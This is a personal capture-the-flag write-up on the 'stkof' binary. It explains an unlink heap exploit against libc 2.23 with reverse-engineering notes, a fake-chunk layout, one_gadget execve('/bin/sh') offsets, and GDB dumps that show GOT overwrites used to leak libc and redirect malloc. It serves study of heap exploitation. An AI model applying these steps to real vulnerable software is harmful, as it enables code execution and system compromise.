# unlink

This section contains illustrations of the unlink exploit, described in `08_heap/01_exploits_examples/04_unlink`.

# stkof

```bash
❯ file stkof
stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
```

```bash
❯ pwn checksec stkof
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Seems to ask for an input, and displays `FAIL` a number of time. Upon analysis with ghidra, the logic is a bit cryptic but here is what it does:
* `1`: allocate with a `malloc` a pointer (which size we can request !) and append it to an array of such pointers. The base of the array seems to be at `DAT_00602140`, while the current size is `DAT_00602100`. It will also print the value of `DAT_00602100`.
* `2`: read an input from the user. First asks for an index to edit, then if it is allocated we give again the index of the section we want to write to. Then we read until we got to the length we specified (and there is probably a little bound check bug here).
* `3`: free an index we specify. If it was allocated, it will free it and set it to null.
* `4`: I don't really get this one. If the index we give was allocated and the length of the string is less than 4, it will display `//TODO` else `...`. Maybe overwrite `puts` got entry ?

I first tried to see if I can conduct a double free (with my own libc-2.31), without success. After that, I resorted to follow the tutorial, by using a unlink exploit (with libc-2.23).

To do the unlink exploit, one has to craft a fake chunk that will be correct enough so that it will be unlinked. The `correct enough` part comprises three parts:
* correct fw/bk pointers
* correct size metadata
* fd next size checks pass (or we avoid them by setting it to 0x0)

As per the tutorial I started creating helper methods to interact with the executable. One of the issue I met was with the `read` helper, where I put more string value than I intended to. As a result, the remaining string would then be fed to the option selection, which would give me `FAIL` messages.

The fake chunk will have to reproduce the following structure:
```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

The gadget that will be used by the exploit is given by:
```bash
one_gadget libc-2.23.so
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
The conditions for the first two does not seem to be fulfilled. The remaining two seem to work.

As for how all of this work I have not wrapped my head around it yet. I can see that after the free there is our forged entry in the list of pointers:
```
gef➤  x/10g 0x00602140
0x602140:	0x0000000000000000	0x00000000010a4020
0x602150:	0x00000000010a44e0	0x00000000010a4590
0x602160:	0x0000000000602148	0x00000000010a46f0  <-- here
0x602170:	0x00000000010a47a0	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
```

Then after the following `read` call:
```
gef➤  x/10g 0x00602140
0x602140:	0x0000000000000000	0x0000000000602030  <-- got address of strlen
0x602150:	0x0000000000602070	0x00000000010a4590  <-- got address of malloc
0x602160:	0x0000000000602148	0x0000000000000000
0x602170:	0x00000000010a47a0	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
```
We can see that we used the pointer we inserted with our `free` exploit to write two other pointers in the list of pointers.

The next call to `read` will overwrite what is pointed by the first pointer (i.e. strlen's got address) with the one for `puts`.

Before:
```
gef➤  x/10g 0x00602140
0x602140:	0x0000000000000000	0x0000000000602030
0x602150:	0x0000000000602070	0x00000000010a4590
0x602160:	0x0000000000602148	0x0000000000000000
0x602170:	0x00000000010a47a0	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
gef➤  x 0x0000000000602030
0x602030 <strlen@got.plt>:	0x0000000000400786
gef➤  x 0x0000000000400786
0x400786 <strlen@plt+6>:	0xffb0e90000000368
```
After:
```
gef➤  x/10g 0x00602140
0x602140:	0x0000000000000000	0x0000000000602030
0x602150:	0x0000000000602070	0x00000000010a4590
0x602160:	0x0000000000602148	0x0000000000000000
0x602170:	0x00000000010a47a0	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
gef➤  x 0x0000000000602030
0x602030 <strlen@got.plt>:	0x0000000000400760
gef➤  x 0x0000000000400760
0x400760 <puts@plt>:	0x0168002018ba25ff
```
So from now on when we call `strlen` we are calling `puts` instead !

Then when we do the `leak` call, the code is going to check the length of the data pointed by the ith pointer. However, the 2nd pointer is pointing at the got address of malloc, and the length check is now replaced with `puts`. So we get the address of malloc.

From now on the rest is quite easy: we compute the base for libc from the leak, and we deduce the address for our gadget. We then put our gadget in the place of `malloc` by overwriting it's got entry (remember, it's the second entry in our pointer list). The next time we call `malloc`, it will trigger our gadget instead.

Unfortunatly the exploit ended with a:
```
$ ls
ls: ./libc-2.23.so: version `GLIBC_2.30' not found (required by /lib/x86_64-linux-gnu/libselinux.so.1)
```
I guess if I execute `stkof` in a machine with a native libc2.23 env and attach remotely the pwn program I would be able to pop a shell.